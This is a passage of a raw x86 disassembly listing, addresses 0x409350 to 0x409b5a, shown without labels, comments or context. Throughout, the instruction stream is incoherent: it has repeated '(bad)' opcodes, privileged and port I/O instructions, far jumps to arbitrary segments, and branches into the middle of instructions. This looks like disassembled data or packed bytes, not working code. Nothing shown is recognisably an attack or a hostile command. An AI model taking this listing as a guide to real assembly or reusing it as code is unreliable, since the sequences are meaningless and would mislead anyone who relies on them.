  409350:	jmp    0x4093cf
  409352:	dec    esi
  409353:	(bad)
  409356:	and    eax,0xd6e8bd75
  40935b:	ror    BYTE PTR [esi*1+0x55f862a1],0x38
  409363:	dec    ebp
  409364:	dec    edx
  409365:	lahf   
  409366:	jle    0x40935e
  409368:	sti    
  409369:	and    esi,DWORD PTR [eax-0x7b]
  40936c:	mov    dl,0xf6
  40936e:	jg     0x409337
  409370:	jmp    DWORD PTR [edi-0x6a75f9eb]
  409376:	jecxz  0x409350
  409378:	pop    edi
  409379:	jae    0x4093f8
  40937b:	test   al,0xe6
  40937d:	adc    eax,0xcde46f83
  409382:	shr    BYTE PTR [ebx],1
  409384:	(bad)  
  409385:	sbb    BYTE PTR [esi+0x47],ah
  409388:	imul   esp,DWORD PTR [edx+0x63d2cf23],0x90ce4727
  409392:	or     dl,BYTE PTR [ecx+0x31]
  409395:	aad    0xe
  409397:	sub    edx,DWORD PTR [eax+0x3a]
  40939a:	es in  al,dx
  40939c:	add    eax,0xb11952fa
  4093a1:	sub    DWORD PTR [ebx*8-0xc12fac4],ebx
  4093a8:	daa    
  4093a9:	repnz adc DWORD PTR [edi],esi
  4093ac:	enter  0x2506,0xfa
  4093b0:	shl    BYTE PTR [ecx+ecx*1],0x58
  4093b4:	retf   0x8365
  4093b7:	cmc    
  4093b8:	and    DWORD PTR [ebx-0x1e],ebx
  4093bb:	or     DWORD PTR [esi-0x50],esp
  4093be:	push   edi
  4093bf:	mov    gs,edi
  4093c1:	popf   
  4093c2:	push   ecx
  4093c3:	jae    0x409411
  4093c5:	jmp    0xb9020aef
  4093ca:	out    dx,eax
  4093cb:	jmp    0x794:0x95790a63
  4093d2:	icebp  
  4093d3:	aas    
  4093d4:	jl     0x4093da
  4093d6:	mov    ebx,0xd6e38b1b
  4093db:	jmp    0x75cd86b7
  4093e0:	push   cs
  4093e1:	xchg   ebp,eax
  4093e2:	pop    esi
  4093e3:	sub    DWORD PTR ds:0x6687e924,edx
  4093e9:	cmp    BYTE PTR [edx+edi*4+0x6a],al
  4093ed:	push   0xe
  4093ef:	in     al,dx
  4093f0:	iret   
  4093f1:	outs   dx,DWORD PTR ds:[esi]
  4093f2:	mov    bl,0x18
  4093f4:	loope  0x40941b
  4093f6:	sbb    BYTE PTR [edi-0x2b],ah
  4093f9:	jmp    0xeb16:0x2f1ee71f
  409400:	sub    DWORD PTR [ebx+0x67d7f3de],0xf402128d
  40940a:	sti    
  40940b:	das    
  40940c:	std    
  40940d:	lock xlat BYTE PTR ds:[ebx]
  40940f:	dec    ebx
  409410:	cmp    ecx,DWORD PTR [esi+0x52]
  409413:	add    ecx,DWORD PTR [eax-0x28c2df0a]
  409419:	clc    
  40941a:	sbb    BYTE PTR [edx-0x34],dh
  40941d:	or     al,0xa4
  40941f:	or     edx,DWORD PTR [eax+ecx*1-0x5a]
  409423:	ins    BYTE PTR es:[edi],dx
  409424:	and    edi,ebx
  409426:	xlat   BYTE PTR ds:[ebx]
  409427:	mov    cl,ch
  409429:	mov    eax,ds:0xd4d2d003
  40942e:	jge    0x409451
  409430:	inc    edx
  409431:	imul   esp,DWORD PTR [esi+0x4b063185],0x73ca4bc
  40943b:	xor    ebx,ebp
  40943d:	push   ss
  40943e:	shr    BYTE PTR [ebx-0x7b],cl
  409441:	or     ebp,esi
  409443:	ret    
  409444:	add    al,0x94
  409446:	xchg   DWORD PTR [edi-0x79],edi
  409449:	jmp    0x40949f
  40944b:	popa   
  40944c:	ror    DWORD PTR [ebx],cl
  40944e:	push   ebx
  40944f:	ror    DWORD PTR ds:0x965fa8a,1
  409455:	push   ebp
  409456:	out    dx,al
  409457:	imul   eax,DWORD PTR [eax+0xd9c3877],0xbe44e448
  409461:	(bad)  
  409462:	adc    al,0xbc
  409464:	adc    al,0x5a
  409466:	sbb    eax,0x5cf171e8
  40946b:	in     al,0xf1
  40946d:	out    0xf0,eax
  40946f:	xor    eax,DWORD PTR [ebx+ecx*8-0x5c20608a]
  409476:	ja     0x409492
  409478:	sbb    BYTE PTR [ebx+0x4ca747af],bl
  40947e:	pop    esi
  40947f:	fstp   QWORD PTR [ebp-0x66138d9]
  409485:	sbb    eax,0x74e63ae0
  40948a:	in     eax,0xb1
  40948c:	je     0x409484
  40948e:	mov    cl,0x8a
  409490:	stos   BYTE PTR es:[edi],al
  409491:	inc    edi
  409492:	cwde   
  409493:	mov    ecx,0x1c3e46e
  409498:	(bad)  
  409499:	xchg   ecx,eax
  40949a:	test   ch,0xb9
  40949d:	push   ebx
  40949e:	outs   dx,BYTE PTR ds:[esi]
  40949f:	cli    
  4094a0:	xchg   esp,eax
  4094a1:	mov    eax,0xdf4fe3db
  4094a6:	cli    
  4094a7:	stos   BYTE PTR es:[edi],al
  4094a8:	ret    
  4094a9:	dec    DWORD PTR [edx-0x48]
  4094ac:	push   edi
  4094ad:	sub    esi,DWORD PTR [ecx-0x1ad2d4b8]
  4094b3:	add    al,0x4f
  4094b5:	sbb    dl,BYTE PTR [edi-0x16105bb4]
  4094bb:	test   eax,0x9cb1ebb
  4094c0:	les    esp,FWORD PTR [eax]
  4094c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4094c3:	sub    DWORD PTR [edx-0x43],ecx
  4094c6:	ficomp WORD PTR [ebx+ebp*4]
  4094c9:	rcr    ah,cl
  4094cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094cc:	stc    
  4094cd:	hlt    
  4094ce:	ins    DWORD PTR es:[edi],dx
  4094cf:	aam    0x95
  4094d1:	popa   
  4094d2:	fisubr DWORD PTR [esi]
  4094d4:	jno    0x409465
  4094d6:	imul   ebp,DWORD PTR [eax],0xa7238ac4
  4094dc:	adc    edx,eax
  4094de:	scas   eax,DWORD PTR es:[edi]
  4094df:	stc    
  4094e0:	mov    edx,0x5c6f18e4
  4094e5:	and    esp,edx
  4094e7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4094e8:	mov    ds:0x6fdc260c,al
  4094ed:	adc    eax,0x8da4415f
  4094f2:	mov    ch,0x90
  4094f4:	xchg   esp,eax
  4094f5:	jge    0x40955e
  4094f7:	loopne 0x40953e
  4094f9:	jns    0x4094ed
  4094fb:	cs push esp
  4094fd:	(bad)  
  4094ff:	dec    ebp
  409500:	mov    al,0x30
  409502:	popa   
  409503:	sbb    al,0x96
  409505:	loop   0x40949c
  409507:	icebp  
  409508:	mov    ch,0xf3
  40950a:	mov    BYTE PTR es:[eax+0x29],0x92
  40950f:	and    ah,BYTE PTR [edi+eiz*1-0x6c]
  409513:	imul   esp,DWORD PTR [esi+esi*1+0x13],0xb724b992
  40951b:	add    BYTE PTR [ecx],0xe4
  40951e:	je     0x40954a
  409520:	xchg   ebx,eax
  409521:	or     BYTE PTR [ebp-0x217ce269],bl
  409527:	jmp    0x409547
  409529:	push   es
  40952a:	pop    edi
  40952b:	jno    0x409529
  40952d:	arpl   ax,bx
  40952f:	jp     0x409541
  409531:	push   edi
  409532:	les    ecx,FWORD PTR [ecx-0x62]
  409535:	mov    esp,0xb29f7ba8
  40953a:	sub    al,BYTE PTR [ebx+0x29]
  40953d:	mov    esp,0x83e15d26
  409542:	cli    
  409543:	(bad)  
  409544:	pop    ds
  409545:	inc    esp
  409546:	or     eax,ebx
  409548:	call   0x22708e6f
  40954d:	mov    ecx,0xb4049f61
  409552:	in     al,dx
  409553:	sbb    DWORD PTR [eax],esi
  409555:	mov    dl,0x70
  409557:	leave  
  409558:	add    BYTE PTR [edx-0xd8bf05a],dh
  40955e:	sub    al,0xbb
  409560:	fist   WORD PTR [ebx+0x2a]
  409563:	and    dh,0x7c
  409566:	outs   dx,BYTE PTR ds:[esi]
  409567:	in     eax,dx
  409568:	rcr    BYTE PTR [esi-0x6a],1
  40956b:	gs pop esp
  40956d:	(bad)  
  40956e:	mov    eax,0x7cf10340
  409573:	inc    esp
  409574:	mov    cl,0x67
  409576:	jge    0x4095be
  409578:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409579:	clc    
  40957a:	test   BYTE PTR [ebx-0x6813509f],al
  409580:	scas   al,BYTE PTR es:[edi]
  409581:	imul   esi,ebx,0x75
  409584:	fstp   QWORD PTR [esi+0x3f]
  409587:	xor    cl,BYTE PTR [esp-0x572503db]
  40958e:	retf   0xf2f3
  409591:	into   
  409592:	shl    ch,cl
  409594:	and    eax,0xf342d2b8
  409599:	and    DWORD PTR [esi],edi
  40959b:	int3   
  40959c:	gs jo  0x4095bf
  40959f:	out    dx,al
  4095a0:	xchg   edx,eax
  4095a1:	fsubr  QWORD PTR [edi]
  4095a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4095a4:	cdq    
  4095a5:	push   edi
  4095a6:	pushf  
  4095a7:	std    
  4095a8:	repz int 0x55
  4095ab:	push   DWORD PTR [esi-0x18f38623]
  4095b1:	xchg   ebx,eax
  4095b2:	sbb    al,0x39
  4095b4:	push   ebx
  4095b5:	push   es
  4095b6:	imul   esi,DWORD PTR [eax],0xffffffb9
  4095b9:	popa   
  4095ba:	int    0x36
  4095bc:	fcom   st(5)
  4095be:	popa   
  4095bf:	test   cl,0xc7
  4095c2:	pop    es
  4095c3:	inc    ebp
  4095c4:	imul   ebp,DWORD PTR [eax+0x67],0x873f241c
  4095cb:	dec    ebp
  4095cc:	inc    ebp
  4095cd:	mov    esi,0xe5b52cb4
  4095d2:	sub    ebp,DWORD PTR [esi+0x31]
  4095d5:	or     eax,0xa900a191
  4095da:	popa   
  4095db:	test   eax,0xe1f11f10
  4095e0:	add    BYTE PTR [ecx-0x3e6ef96e],bh
  4095e6:	fs push 0xffffffb2
  4095e9:	ficom  DWORD PTR [ebp-0x68]
  4095ec:	out    dx,eax
  4095ed:	mov    WORD PTR [ebx],?
  4095ef:	into   
  4095f0:	sub    DWORD PTR [ecx-0x53937718],ecx
  4095f6:	stos   BYTE PTR es:[edi],al
  4095f7:	fisubr WORD PTR [ecx+0x2cd16cae]
  4095fd:	bound  ecx,QWORD PTR [esi-0x69]
  409600:	cmp    BYTE PTR [bp+di+0x63],al
  409604:	or     BYTE PTR [ebp-0x7a],0xc7
  409608:	mov    ecx,0xd2b4874c
  40960d:	arpl   WORD PTR [ebx-0x9],di
  409610:	cli    
  409611:	mov    ds:0x6446ccd2,eax
  409616:	push   ds
  409617:	cmp    DWORD PTR [ebx+0x4aa2e98],0xece42508
  409621:	xchg   esp,eax
  409622:	jmp    0x90a3da40
  409627:	jp     0x4095d1
  409629:	cli    
  40962a:	lods   eax,DWORD PTR ds:[esi]
  40962b:	out    dx,eax
  40962c:	jmp    0x40967f
  40962e:	adc    DWORD PTR [ebx+edx*2+0x51d4ab09],0xffffffbd
  409636:	xchg   edx,eax
  409637:	sbb    BYTE PTR [esp+eax*2],ch
  40963a:	push   edx
  40963b:	std    
  40963c:	push   0x734dcc2b
  409641:	fs cmp eax,0x70125255
  409647:	fadd   st,st(7)
  409649:	sub    ah,ah
  40964b:	leave  
  40964c:	daa    
  40964d:	push   edi
  40964e:	jnp    0x4095d9
  409650:	mov    esp,0xc05e48eb
  409655:	xor    DWORD PTR [edx],0xe
  409658:	inc    esi
  409659:	(bad)  
  40965a:	fbld   TBYTE PTR [ecx-0x2b69d858]
  409660:	push   edx
  409661:	sub    dl,BYTE PTR [edx-0x3f]
  409664:	pop    es
  409665:	stos   BYTE PTR es:[edi],al
  409666:	call   0x3a82df10
  40966b:	test   BYTE PTR [ebp+0x5e],al
  40966e:	mov    cl,0xc4
  409670:	lods   eax,DWORD PTR ds:[esi]
  409671:	add    al,0xf4
  409673:	lods   eax,DWORD PTR ds:[si]
  409675:	ins    BYTE PTR es:[edi],dx
  409676:	xor    esi,ecx
  409678:	adc    esp,ecx
  40967a:	enter  0xe29a,0x8e
  40967e:	cmp    esp,ebx
  409680:	jnp    0x409629
  409682:	inc    esi
  409683:	retf   
  409684:	xor    ecx,DWORD PTR [edi]
  409686:	jl     0x4096a0
  409688:	stos   BYTE PTR es:[edi],al
  409689:	(bad)  
  40968a:	fmul   st(0),st
  40968c:	scas   eax,DWORD PTR es:[edi]
  40968d:	add    al,0xdb
  40968f:	in     al,dx
  409690:	out    0xd9,al
  409692:	outs   dx,BYTE PTR ds:[si]
  409694:	scas   al,BYTE PTR es:[edi]
  409695:	ret    0x5f80
  409698:	cld    
  409699:	call   0xc78131ef
  40969e:	scas   al,BYTE PTR es:[edi]
  40969f:	jne    0x40963a
  4096a1:	push   ecx
  4096a2:	mov    al,ds:0xf65fb134
  4096a7:	imul   ebp,DWORD PTR [ebp-0x75870f58],0x4ddf27a8
  4096b1:	out    dx,eax
  4096b2:	xchg   esp,eax
  4096b3:	dec    ebp
  4096b4:	into   
  4096b5:	pop    edx
  4096b6:	cmp    ecx,esp
  4096b8:	(bad)  
  4096ba:	and    DWORD PTR ds:0x7e69cf76,esp
  4096c0:	push   edx
  4096c1:	rcr    BYTE PTR [eax],cl
  4096c3:	gs js  0x409731
  4096c6:	cmp    cl,BYTE PTR [ecx+ebx*8-0x6a]
  4096ca:	mov    DWORD PTR [edx+0x8],ebx
  4096cd:	cmp    esp,DWORD PTR [ecx+0x47e2152d]
  4096d3:	xor    bl,BYTE PTR [ecx-0x4d09ed38]
  4096d9:	enter  0x3176,0x71
  4096dd:	or     BYTE PTR [esi],ch
  4096df:	sbb    esp,DWORD PTR [esi+edi*4-0x45fc519]
  4096e6:	js     0x4096df
  4096e8:	push   cs
  4096e9:	jl     0x409750
  4096eb:	mov    ecx,0x938de1ce
  4096f0:	and    esp,ebx
  4096f2:	push   ecx
  4096f3:	mov    al,ds:0x38193199
  4096f8:	gs call 0xbc379f0b
  4096fe:	xor    eax,0xa55456dd
  409703:	or     esp,esp
  409705:	or     esi,0x31
  409708:	test   eax,0x7233cdcc
  40970d:	push   esi
  40970e:	mov    edi,esi
  409710:	repnz push ss
  409712:	rep lods eax,DWORD PTR ds:[esi]
  409714:	rcr    DWORD PTR [ebx+0x714987ee],1
  40971a:	outs   dx,BYTE PTR ds:[esi]
  40971b:	arpl   WORD PTR [ebp-0x5b],bp
  40971e:	jg     0x4096b6
  409720:	jb     0x4096aa
  409722:	call   0x910921e2
  409727:	in     al,dx
  409728:	repnz lods eax,DWORD PTR ds:[esi]
  40972a:	xchg   edi,eax
  40972b:	inc    esp
  40972c:	loop   0x4096b5
  40972e:	inc    ebx
  40972f:	dec    ebp
  409730:	add    bl,ch
  409732:	outs   dx,DWORD PTR ds:[esi]
  409733:	jo     0x4096d5
  409735:	push   0x9f7d894c
  40973a:	mov    edx,0x1d0aa889
  40973f:	popa   
  409740:	ds dec eax
  409742:	or     edx,esi
  409744:	jl     0x409783
  409746:	pop    esp
  409747:	sbb    ebx,DWORD PTR [esi+0x76]
  40974a:	out    dx,eax
  40974b:	loopne 0x409797
  40974d:	fisttp DWORD PTR [ebp-0x5b]
  409750:	cwde   
  409751:	pusha  
  409752:	imul   ebx,DWORD PTR [ecx+0x111c4bfc],0x39538775
  40975c:	test   al,bh
  40975e:	int3   
  40975f:	ret    0x5cf8
  409762:	dec    BYTE PTR [ecx]
  409764:	neg    ebp
  409766:	cmp    DWORD PTR [eax+esi*1-0x65],ebx
  40976a:	fst    st(4)
  40976c:	lock add BYTE PTR [edx+0x17],ah
  409770:	jl     0x409798
  409772:	mov    esi,0x9098499f
  409777:	out    dx,eax
  409778:	ds mov cl,0x39
  40977b:	loope  0x409730
  40977d:	(bad)  
  40977e:	xchg   BYTE PTR [ecx],dh
  409780:	ins    DWORD PTR es:[edi],dx
  409781:	add    eax,0xf25beafe
  409786:	js     0x4097ea
  409788:	mov    ds:0xff2aec5b,eax
  40978d:	aam    0x82
  40978f:	jle    0x40976b
  409791:	cmp    dh,dl
  409793:	shl    ch,0xdc
  409796:	dec    edi
  409797:	add    eax,0x2089f1ee
  40979c:	jb     0x40972a
  40979e:	das    
  40979f:	int    0xa5
  4097a1:	in     eax,0x7f
  4097a3:	lods   eax,DWORD PTR ds:[esi]
  4097a4:	gs out dx,al
  4097a6:	dec    edi
  4097a7:	xchg   edi,eax
  4097a8:	arpl   bx,ax
  4097aa:	fiadd  WORD PTR [ecx]
  4097ac:	sbb    ah,BYTE PTR [ebx-0x914c97e]
  4097b2:	sbb    bh,BYTE PTR [ecx+eiz*1-0x6d]
  4097b6:	(bad)  
  4097b7:	jne    0x409822
  4097b9:	jmp    0xc85e489a
  4097be:	jae    0x4097c9
  4097c0:	sbb    ch,bh
  4097c2:	xor    BYTE PTR [ecx],dh
  4097c4:	dec    ebx
  4097c5:	jl     0x4097aa
  4097c7:	(bad)  
  4097c8:	fld    DWORD PTR [edi+0x1d]
  4097cb:	xor    DWORD PTR [edi-0x67],eax
  4097ce:	sbb    DWORD PTR [eax-0x1c],ecx
  4097d1:	outs   dx,BYTE PTR ds:[esi]
  4097d2:	push   ebp
  4097d3:	xor    edi,DWORD PTR [edx-0x48]
  4097d6:	test   eax,0x68e0f1b0
  4097db:	and    DWORD PTR [ebp-0x7297ca08],edi
  4097e1:	sbb    eax,0x9318953a
  4097e6:	xchg   ecx,eax
  4097e7:	hlt    
  4097e8:	add    eax,0x7d825797
  4097ed:	sub    BYTE PTR [esi-0x3b479650],bl
  4097f3:	sahf   
  4097f4:	sbb    cl,ch
  4097f6:	xchg   ebp,eax
  4097f7:	shl    ebx,cl
  4097f9:	xchg   esp,eax
  4097fa:	fistp  QWORD PTR [ebp-0x4d]
  4097fd:	xchg   esi,eax
  4097fe:	mov    edx,0xe15b3ab3
  409803:	sub    bl,ch
  409805:	xlat   BYTE PTR ds:[ebx]
  409806:	in     al,dx
  409807:	sbb    BYTE PTR [esi-0x5f4b7177],al
  40980d:	inc    DWORD PTR [esi-0x25]
  409810:	add    ebx,0xa6d0291
  409816:	push   0xda2d9345
  40981b:	dec    eax
  40981c:	add    BYTE PTR [esi-0x3015cfb6],dl
  409822:	xor    ebp,DWORD PTR [ecx+esi*2+0x63]
  409826:	mov    eax,0x56707b8a
  40982c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40982d:	bound  ebp,QWORD PTR [ebx]
  40982f:	int3   
  409830:	clc    
  409831:	jle    0x40984b
  409833:	sbb    al,0x37
  409835:	mov    ebp,0x3c2c923b
  40983a:	stos   DWORD PTR es:[edi],eax
  40983b:	mov    edi,0x36a1231a
  409840:	fcom   QWORD PTR [ecx-0x2f11b106]
  409846:	sbb    dl,BYTE PTR [edx-0x24ddc77a]
  40984c:	call   0x57e351d3
  409851:	xor    ebx,DWORD PTR [ebx+eiz*8+0x5f2fe7c1]
  409858:	jle    0x409817
  40985a:	jmp    0x409858
  40985c:	fwait
  40985d:	xchg   DWORD PTR [edi+eax*1],esi
  409860:	repz push edi
  409862:	xor    DWORD PTR [esi-0x44c8b17e],0x5bc92685
  40986c:	hlt    
  40986d:	inc    edi
  40986e:	out    0x4b,eax
  409870:	imul   edi,DWORD PTR [edx+esi*4],0xffffffd2
  409874:	and    DWORD PTR [ecx-0x3d],edi
  409877:	jo     0x4098d2
  409879:	into   
  40987a:	push   ebx
  40987b:	inc    eax
  40987c:	push   ebx
  40987d:	add    BYTE PTR [esi+edi*4-0x20],dl
  409881:	dec    esi
  409882:	dec    ecx
  409883:	push   0xb9c26e85
  409888:	in     eax,0xe6
  40988a:	cdq    
  40988b:	ins    BYTE PTR es:[edi],dx
  40988c:	cmp    bl,0xeb
  40988f:	xor    al,0x29
  409891:	mov    al,0x35
  409893:	aad    0x8
  409895:	sti    
  409896:	pop    edi
  409897:	xor    ah,cl
  409899:	repz ret 0x484f
  40989d:	push   ss
  40989e:	ror    BYTE PTR [ecx+0xc23cf42],cl
  4098a4:	xor    ecx,DWORD PTR [eax+0x258969dd]
  4098aa:	outs   dx,DWORD PTR ds:[esi]
  4098ab:	je     0x409874
  4098ad:	xchg   esi,eax
  4098ae:	out    0xf2,al
  4098b0:	mov    ah,0x23
  4098b2:	ins    DWORD PTR es:[edi],dx
  4098b3:	cli    
  4098b4:	dec    edx
  4098b5:	or     dh,BYTE PTR [edx+0x1d]
  4098b8:	inc    edi
  4098b9:	in     al,dx
  4098ba:	gs pop ds
  4098bc:	aaa    
  4098bd:	mov    esi,0x7b0f091f
  4098c2:	enter  0x707d,0xb3
  4098c6:	sbb    dl,dl
  4098c8:	adc    dl,BYTE PTR ds:0xc2771d2e
  4098ce:	or     ch,0x8c
  4098d1:	inc    eax
  4098d2:	dec    ebx
  4098d3:	sbb    BYTE PTR [esi+0x62],bh
  4098d6:	cmp    esp,ebp
  4098d8:	aas    
  4098d9:	scas   eax,DWORD PTR es:[edi]
  4098da:	call   0x99e29172
  4098df:	sahf   
  4098e0:	lea    esi,[edi+0x2d]
  4098e3:	xchg   BYTE PTR [edx-0x40],cl
  4098e6:	clc    
  4098e7:	mov    edx,0xf78e6b81
  4098ec:	or     eax,0x8d83d05
  4098f1:	jg     0x409917
  4098f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098f4:	jb     0x409932
  4098f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098f7:	jno    0x40991f
  4098f9:	jmp    0x82dd:0x4a80ed7e
  409900:	push   edi
  409901:	jge    0x40995b
  409903:	add    al,0x5f
  409905:	rcr    DWORD PTR [eax+0xc835657],0x14
  40990c:	cmp    eax,0x48fadc7b
  409911:	mov    ds:0x55b38e96,eax
  409916:	lahf   
  409917:	jns    0x4098b3
  409919:	fcomp  DWORD PTR [eax+0x7d79b462]
  40991f:	or     eax,eax
  409921:	cdq    
  409922:	cmp    al,0xca
  409924:	ja     0x4098bd
  409926:	mov    ah,0xa
  409928:	ins    DWORD PTR es:[edi],dx
  409929:	sbb    BYTE PTR [edx],0x42
  40992c:	sub    al,0xf
  40992e:	aaa    
  40992f:	popa   
  409930:	fist   WORD PTR [ebx-0x19]
  409933:	and    eax,0x25d903a
  409938:	out    0xf8,al
  40993a:	rcr    bl,cl
  40993c:	cmp    BYTE PTR [ebx-0x4b60c957],dh
  409942:	sub    ecx,DWORD PTR [esi+0x1]
  409945:	sub    BYTE PTR [edi-0x22],bl
  409948:	cli    
  409949:	mov    esi,DWORD PTR [ebp+0x3248b812]
  40994f:	inc    ebp
  409950:	aas    
  409951:	add    dh,BYTE PTR [ebx+0x3c]
  409954:	mov    eax,ds:0x1bff2dc2
  409959:	push   edx
  40995a:	pop    esp
  40995b:	daa    
  40995c:	imul   DWORD PTR [edx+0x3e2f95a7]
  409962:	xchg   ecx,eax
  409963:	sbb    eax,0x18ad4f3f
  409968:	xchg   esi,eax
  409969:	mov    cl,0x30
  40996b:	in     al,dx
  40996c:	out    0x34,eax
  40996e:	lahf   
  40996f:	push   edx
  409970:	sbb    eax,DWORD PTR [eax-0x9152e06]
  409976:	fidiv  WORD PTR [edi]
  409978:	ss sub ebx,edx
  40997b:	adc    BYTE PTR [ebx],al
  40997d:	rol    cl,cl
  40997f:	mov    BYTE PTR [ecx+0x5f],cl
  409982:	ret    
  409983:	outs   dx,BYTE PTR ds:[esi]
  409984:	test   eax,0x4ec60beb
  409989:	in     al,0x4b
  40998b:	push   edi
  40998c:	adc    bh,BYTE PTR [ecx+0x49cb5b9e]
  409992:	rol    al,cl
  409994:	jmp    0xa810b13b
  409999:	dec    esp
  40999a:	clc    
  40999b:	cmp    ah,dl
  40999d:	adc    eax,0xe
  4099a0:	jne    0x4099dd
  4099a2:	mov    ss,WORD PTR [edi*8-0x58499e69]
  4099a9:	cmp    dh,BYTE PTR ss:[bp+si-0x71]
  4099ae:	gs jno 0x4099a0
  4099b1:	adc    al,BYTE PTR [edx]
  4099b3:	or     DWORD PTR [edx-0x5db8fd6e],edi
  4099b9:	jne    0x40995f
  4099bb:	fld    QWORD PTR [ebx+0x2f4bdb34]
  4099c1:	fsubr  DWORD PTR [edx-0x2c]
  4099c4:	lods   al,BYTE PTR ds:[esi]
  4099c5:	add    eax,0xe28db59d
  4099ca:	xchg   edi,eax
  4099cb:	or     eax,0x58e52ed0
  4099d0:	sbb    BYTE PTR [edx-0x4f],cl
  4099d3:	mov    esp,0x5a5b00fd
  4099d8:	cwde   
  4099d9:	xor    bh,BYTE PTR [ecx]
  4099db:	cli    
  4099dc:	ret    0xf177
  4099df:	xchg   esi,eax
  4099e0:	outs   dx,BYTE PTR ds:[esi]
  4099e1:	sbb    DWORD PTR [ecx+eiz*8+0x3f906ecb],esi
  4099e8:	aas    
  4099e9:	fmul   st(3),st
  4099eb:	pusha  
  4099ec:	fcom   QWORD PTR [ebx-0x1f118763]
  4099f2:	inc    edx
  4099f3:	cmc    
  4099f4:	jne    0x409a2c
  4099f6:	es sbb eax,0x124a9fc9
  4099fc:	ja     0x409a5c
  4099fe:	daa    
  4099ff:	xor    BYTE PTR [ebx+0x5fb4e1fe],dl
  409a05:	(bad)  
  409a07:	imul   edx,DWORD PTR cs:[esi-0x4cadeb3e],0x94981dc2
  409a12:	jmp    0xcc8f2b39
  409a17:	mov    eax,0xfae28068
  409a1c:	imul   ecx,DWORD PTR [ebp+0x5b],0x7be46077
  409a23:	mov    ah,0x64
  409a25:	mov    ebp,0x26a86752
  409a2a:	dec    esi
  409a2b:	add    dl,BYTE PTR [edi]
  409a2d:	dec    esp
  409a2e:	mov    ds:0x77012723,al
  409a33:	dec    ecx
  409a34:	xor    esi,DWORD PTR [edi]
  409a36:	pop    ss
  409a37:	add    DWORD PTR [edx+0x6b92cba6],ecx
  409a3d:	jmp    0xf3e7b4b3
  409a42:	cmp    edx,DWORD PTR [esi+0x7e]
  409a45:	aaa    
  409a46:	inc    ebp
  409a47:	pop    esp
  409a48:	dec    ebp
  409a49:	mov    dh,0xae
  409a4b:	cwde   
  409a4c:	loope  0x409ac8
  409a4e:	pusha  
  409a4f:	pop    ebp
  409a50:	jp     0x409a54
  409a52:	sub    al,0xb7
  409a54:	or     al,0xaf
  409a56:	mov    ch,0x61
  409a58:	nop
  409a59:	inc    ebp
  409a5a:	outs   dx,DWORD PTR ds:[esi]
  409a5b:	mov    cs,WORD PTR [edx-0x28c75d91]
  409a61:	sbb    ecx,eax
  409a63:	and    bl,BYTE PTR [esi]
  409a65:	bnd jnp 0x409a55
  409a68:	das    
  409a69:	ds jmp 0xcc05:0xe2cb1f3a
  409a71:	adc    ah,BYTE PTR [ecx]
  409a73:	pop    ecx
  409a74:	cli    
  409a75:	jecxz  0x409a33
  409a77:	mov    esp,0xbc859dc9
  409a7c:	ins    BYTE PTR es:[edi],dx
  409a7d:	neg    DWORD PTR ds:0xcec0717b
  409a83:	push   ebp
  409a84:	inc    eax
  409a85:	or     ecx,ebx
  409a87:	and    DWORD PTR [eax-0x489db782],0xf5ae2143
  409a91:	xchg   BYTE PTR [esi],dl
  409a93:	and    DWORD PTR [edi+0xd0bec7f],ebx
  409a99:	add    al,0xcb
  409a9b:	test   al,0x5d
  409a9d:	adc    esi,DWORD PTR [edi+0x5e]
  409aa0:	ret    
  409aa1:	call   0x63fc:0xb3deab1d
  409aa8:	ss es dec edx
  409aab:	enter  0x4d88,0x8a
  409aaf:	sbb    al,0x52
  409ab1:	ins    BYTE PTR es:[edi],dx
  409ab2:	outs   dx,DWORD PTR ds:[esi]
  409ab3:	into   
  409ab4:	xchg   edi,eax
  409ab5:	(bad)  [eax-0x1eaff66a]
  409abb:	sub    dl,al
  409abd:	xchg   ebp,eax
  409abe:	and    BYTE PTR [eax-0x3c],ah
  409ac1:	push   ss
  409ac2:	and    DWORD PTR [eax-0x7a],0xa675b18
  409ac9:	push   edi
  409aca:	jl     0x409ab6
  409acc:	dec    esi
  409acd:	mov    esp,0x929becc7
  409ad2:	inc    ebx
  409ad3:	fstp   TBYTE PTR [esi-0x4dd65cff]
  409ad9:	cmp    al,0xe
  409adb:	int3   
  409adc:	pop    es
  409add:	sahf   
  409ade:	jl     0x409a72
  409ae0:	inc    edx
  409ae1:	gs sar esi,cl
  409ae4:	stos   DWORD PTR es:[edi],eax
  409ae5:	push   ss
  409ae6:	sti    
  409ae7:	stos   BYTE PTR es:[edi],al
  409ae8:	sahf   
  409ae9:	adc    bl,0xcf
  409aec:	out    dx,al
  409aed:	dec    eax
  409aee:	ins    DWORD PTR es:[edi],dx
  409aef:	sbb    DWORD PTR [edi],ecx
  409af1:	inc    esi
  409af2:	cs push eax
  409af4:	test   DWORD PTR [edx-0x7e],0x1c1277b1
  409afb:	sbb    BYTE PTR [ebx-0x7eff150a],bl
  409b01:	sbb    cl,dl
  409b03:	adc    ecx,ebp
  409b05:	or     ebp,edx
  409b07:	test   ebx,esi
  409b09:	mov    ecx,0xe3b7a4ae
  409b0e:	jne    0x409b70
  409b10:	popa   
  409b11:	xor    dl,BYTE PTR [ebx-0x53]
  409b14:	mov    edx,0x4b53de29
  409b19:	arpl   WORD PTR ds:0x8b6d0982,bx
  409b1f:	arpl   dx,cx
  409b21:	pop    esp
  409b22:	(bad)  [ecx+0xb913607]
  409b28:	mov    ecx,0x93ea9803
  409b2d:	jle    0x409abf
  409b2f:	jbe    0x409b17
  409b31:	or     al,0xd8
  409b33:	lods   eax,DWORD PTR ds:[esi]
  409b34:	sbb    ebp,edx
  409b36:	add    al,ch
  409b38:	xor    BYTE PTR [eax+0x66],0xcb
  409b3c:	jge    0x409b0b
  409b3e:	popf   
  409b3f:	push   ecx
  409b40:	jle    0x409adb
  409b42:	mov    si,0xaebb
  409b46:	or     esp,DWORD PTR [eax-0x3]
  409b49:	push   ecx
  409b4a:	cs in  eax,dx
  409b4c:	and    BYTE PTR [esi+0x1f],0xfb
  409b50:	cmc    
  409b51:	fdivrp st(0),st
  409b53:	add    eax,0x86d41e77
  409b58:	pop    ebp
  409b59:	das    
  409b5a:	test   DWORD PTR ds:0x4720126d,esi
